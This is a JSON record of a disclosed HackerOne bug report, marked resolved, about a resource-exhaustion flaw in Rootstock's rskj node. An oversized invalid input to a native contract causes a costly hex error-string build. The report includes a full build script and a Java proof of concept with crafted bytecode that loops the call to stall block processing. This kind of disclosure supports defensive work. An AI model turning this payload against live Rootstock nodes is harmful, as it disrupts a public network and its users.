@@ -1,0 +1,134 @@
+{
+  "id": 2559404,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTU5NDA0",
+  "url": "https://hackerone.com/reports/2559404",
+  "title": "Crafted smart contract can take ~23 seconds to execute due to immense error string construction",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2024-06-18T20:18:09.551Z",
+  "submitted_at": "2024-06-18T20:18:10.209Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "guido",
+    "url": "/guido",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 25854,
+    "url": "https://hackerone.com/rootstocklabs",
+    "handle": "rootstocklabs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/7q67oftq9lv3d00bgl62x7sn1j6e/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/7q67oftq9lv3d00bgl62x7sn1j6e/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rootstock Labs",
+      "twitter_handle": "rootstocklabs",
+      "website": "https://rootstocklabs.com",
+      "about": "Make Bitcoin work for everyone"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-06-12T18:52:17.850Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-06-12T18:52:17.274Z",
+  "team_member_agreed_on_going_public_at": "2025-06-10T15:14:45.295Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Calling the native contract (`rskj-core/src/main/java/co/rsk/pcc/NativeContract.java`) with an invalid, large input (1081344 bytes -- I experimentally determined that this is about the slowest I can go) in an infinite loop (until gas runs out) takes about 70 seconds on my machine (I assume ~23 seconds on your machine). (Slightly faster than https://hackerone.com/reports/2489843).\n\nThe cause of the issue is that `NativeContract.execute` constructs the entirety of the input message as a hex string for logging and throwing an exception: https://github.com/rsksmart/rskj/blob/e130ef722ca87eb881d4da435b30ec23f8fee15a/rskj-core/src/main/java/co/rsk/pcc/NativeContract.java#L122\n\n```cpp\nString errorMessage = String.format(\"Invalid data given: %s.\", ByteUtil.toHexString(data));\n```\n\nIf you change this to (for the sake of demonstration):\n\n```cpp\nString errorMessage = String.format(\"Invalid data given: %s.\", \"\");\n```\n\nThe reproducer finishes in about 4.4 seconds (on my machine).\n\nThe reproducer below disables logging; if this is enabled by default on production nodes, it will presumably take even longer.\n\n```sh\nwget -q https://download.java.net/java/GA/jdk11/9/GPL/openjdk-11.0.2_linux-x64_bin.tar.gz\ntar zxf openjdk-11.0.2_linux-x64_bin.tar.gz\nexport JAVA_HOME=$(realpath jdk-11.0.2/)\ngit clone --depth 1 https://github.com/rsksmart/rskj.git\ncd rskj/\necho \"task testJar(type: Jar) {\" >>rskj-core/build.gradle\necho \"    from sourceSets.test.output\" >>rskj-core/build.gradle\necho \"    classifier = 'tests'\" >>rskj-core/build.gradle\necho \"}\" >>rskj-core/build.gradle\necho \"assemble.dependsOn(testJar)\" >>rskj-core/build.gradle\n./configure.sh\n\n# Disable logging\necho \"\"\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\n<configuration>\n    <root level=\\\"OFF\\\">\n    </root>\n</configuration>\"\"\" >rskj-core/src/test/resources/logback.xml\n\n# Build rskj\n./gradlew assemble\n\n# Construct reproducer\necho \"\"\"\nimport co.rsk.config.TestSystemProperties;\nimport co.rsk.config.VmConfig;\nimport java.util.HashSet;\nimport javax.xml.bind.DatatypeConverter;\nimport co.rsk.test.builders.AccountBuilder;\nimport co.rsk.test.builders.TransactionBuilder;\nimport org.ethereum.config.blockchain.upgrades.ActivationConfig;\nimport org.ethereum.config.blockchain.upgrades.ActivationConfigsForTest;\nimport org.ethereum.core.BlockFactory;\nimport org.ethereum.core.BlockTxSignatureCache;\nimport org.ethereum.core.ReceivedTxSignatureCache;\nimport org.ethereum.vm.*;\nimport org.ethereum.vm.program.Program;\nimport org.ethereum.vm.program.invoke.ProgramInvokeMockImpl;\nimport org.ethereum.core.Account;\nimport org.ethereum.core.Transaction;\nimport java.math.BigInteger;\n\npublic class Poc {\n    static private final TestSystemProperties config = new TestSystemProperties();\n    static private final PrecompiledContracts precompiledContracts = new PrecompiledContracts(config, null, new BlockTxSignatureCache(new ReceivedTxSignatureCache()));\n    static private final BlockFactory blockFactory = new BlockFactory(config.getActivationConfig());\n    static private VmConfig vmConfig = config.getVmConfig();\n    static private ProgramInvokeMockImpl invoke = new ProgramInvokeMockImpl();\n    static private ActivationConfig.ForBlock activations = ActivationConfigsForTest.lovell700().forBlock(0);\n    private static Transaction createTransaction() {\n        int number = 0;\n        AccountBuilder acbuilder = new AccountBuilder();\n        acbuilder.name(\\\"sender\\\" + number);\n        Account sender = acbuilder.build();\n        acbuilder.name(\\\"receiver\\\" + number);\n        Account receiver = acbuilder.build();\n        TransactionBuilder txbuilder = new TransactionBuilder();\n        return txbuilder.sender(sender).receiver(receiver).value(BigInteger.valueOf(1000)).build();\n    }\n    public static void main(String[] args) {\n        TestSystemProperties config = new TestSystemProperties();\n        PrecompiledContracts precompiledContracts = new PrecompiledContracts(config, null, new BlockTxSignatureCache(new ReceivedTxSignatureCache()));\n        BlockFactory blockFactory = new BlockFactory(config.getActivationConfig());\n        VmConfig vmConfig = config.getVmConfig();\n        ProgramInvokeMockImpl invoke = new ProgramInvokeMockImpl();\n        ActivationConfig.ForBlock activations = ActivationConfigsForTest.arrowhead600().forBlock(0);\n        invoke.setGas(6800000); /* block limit */\n\n        byte[] code = DatatypeConverter.parseHexBinary(\n                \\\"5b6000600062108000600063010000095afa50600056\\\");\n        VM vm = new VM(vmConfig, precompiledContracts);\n        Transaction transaction = createTransaction();\n        Program program = new Program(vmConfig, precompiledContracts, blockFactory, activations, code, invoke, transaction, new HashSet<>(), new BlockTxSignatureCache(new ReceivedTxSignatureCache()));\n\n        try {\n            while (!program.isStopped())\n                vm.step(program);\n        } catch (RuntimeException e) {\n            program.setRuntimeFailure(e);\n        }\n    }\n}\"\"\" >Poc.java\n\n# Build reproducer\n$JAVA_HOME/bin/javac -cp rskj-core/build/libs/rskj-core-6.3.0-SNAPSHOT-tests.jar:rskj-core/build/libs/rskj-core-6.3.0-SNAPSHOT-all.jar Poc.java\n# Run reproducer\ntime $JAVA_HOME/bin/java -cp .:rskj-core/build/libs/rskj-core-6.3.0-SNAPSHOT-tests.jar:rskj-core/build/libs/rskj-core-6.3.0-SNAPSHOT-all.jar Poc\n```\n\nI will only submit one bug at a time. The sooner a bounty is rewarded, the sooner I will submit more bugs.\nThanks.\n\n## Impact\n\nStall the network.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 23,
+  "voters": [
+    "zy9ard3",
+    "deel_",
+    "mohaned0101",
+    "cosmossec",
+    "thalaivar304",
+    "2026",
+    "bugtor",
+    "galactuss",
+    "hackerarnav00",
+    "heavenlydemongod",
+    "and 13 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5820,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rsksmart/rskj",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
